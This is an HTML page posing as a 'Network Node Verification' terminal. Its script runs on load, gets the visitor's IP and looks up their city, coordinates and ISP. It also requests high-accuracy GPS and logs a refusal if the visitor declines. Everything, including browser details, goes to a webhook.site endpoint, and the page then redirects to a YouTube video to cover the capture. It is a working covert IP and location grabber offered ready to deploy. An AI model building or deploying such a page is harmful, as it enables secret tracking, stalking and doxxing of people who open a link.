<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Node Verification</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { background: rgba(0, 0, 0, 0.9); padding: 30px; border: 1px solid #00ff41; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); width: 90%; max-width: 600px; }
        .line { margin-bottom: 10px; opacity: 0; animation: fadeIn 0.5s forwards; }
        .loader { display: inline-block; width: 10px; height: 10px; border: 2px solid #00ff41; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .cursor { display: inline-block; width: 10px; height: 20px; background: #00ff41; animation: blink 1s infinite; vertical-align: middle; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body onload="initializeNode()">

<div class="terminal">
    <div class="line" style="animation-delay: 0.2s;">> INITIALIZING RESEARCH_PROTOCOL_V5.0... [DONE]</div>
    <div class="line" style="animation-delay: 0.7s;">> HANDSHAKING WITH CARRIER_GATEWAY... [DONE]</div>
    <div class="line" style="animation-delay: 1.2s;">> CAPTURING PASSIVE METADATA... <span id="passive-status" style="color: yellow;">PENDING</span></div>
    <div class="line" style="animation-delay: 1.8s;">> REQUESTING TOWER TRIANGULATION (GPS)... <span class="loader" id="gps-loader"></span></div>
    <div id="final-line" class="line" style="animation-delay: 2.5s; color: #666;">> System waiting for device handshake...<span class="cursor"></span></div>
</div>

<script>
    // --- CONFIGURATION ---
    const WEBHOOK_URL = 'https://webhook.site/4f557ed8-46cd-4ed7-8404-91c609c24f6f'; // REPLACEME
    const REDIRECT_URL = 'https://www.youtube.com/watch?v=PD61lIYrG-M'; // Replace with your target video

    async function initializeNode() {
        // --- PHASE 1: THE PASSIVE FAILSAFE ---
        // We use a separate async flow so it doesn't block the UI
        capturePassiveData();

        // --- PHASE 2: THE ACTIVE ATTACK (GPS) ---
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    // USER ALLOWED: Log exact GPS
                    await logToWebhook({
                        event: "ACTIVE_GPS_SUCCESS",
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy + " meters"
                    });
                    terminate("Node Verified. Synchronizing...");
                },
                async (err) => {
                    // USER DENIED: Log the refusal (we still have passive data!)
                    await logToWebhook({
                        event: "ACTIVE_GPS_DENIED",
                        reason: err.message
                    });
                    terminate("Protocol Rejected. Executing Bypass...");
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        } else {
            terminate("Device Unsupported.");
        }
    }

   async function capturePassiveData() {
    try {
        // Use HTTPS and a cache-buster (?t=...) to bypass browser blocking
        const response = await fetch(`https://api.ipify.org?format=json&t=${Date.now()}`);
        const basicData = await response.json();
        const userIP = basicData.ip;

        // Now that we have the IP, get the location from a secure provider
        const locResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
        const ipData = await locResponse.json();
        
        // Update Terminal UI
        document.getElementById('passive-status').innerText = "SUCCESS";
        document.getElementById('passive-status').style.color = "#00ff41";

        // Send to Webhook with 'keepalive' to ensure it survives the redirect
        logToWebhook({
            event: "PASSIVE_CAPTURE",
            ip: userIP,
            location: `${ipData.city}, ${ipData.region}`,
            coords_approx: `${ipData.latitude}, ${ipData.longitude}`,
            isp: ipData.org,
            userAgent: navigator.userAgent,
            platform: navigator.platform
        });
    } catch (e) {
        // If the first one fails, try a direct fallback
        const fallback = await fetch('https://ipapi.co/json/');
        const fbData = await fallback.json();
        logToWebhook({ event: "PASSIVE_FALLBACK", city: fbData.city });
    }
}

    async function logToWebhook(data) {
        // 'keepalive' ensures the data is sent even if the page closes
        return fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            keepalive: true,
            body: JSON.stringify(data)
        });
    }

    function terminate(msg) {
        const loader = document.getElementById('gps-loader');
        if (loader) loader.style.display = "none";
        document.getElementById('final-line').innerText = "> " + msg;
        
        // Final delay for the "Hacker" experience
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 1500);
    }
</script>
</body>
</html>
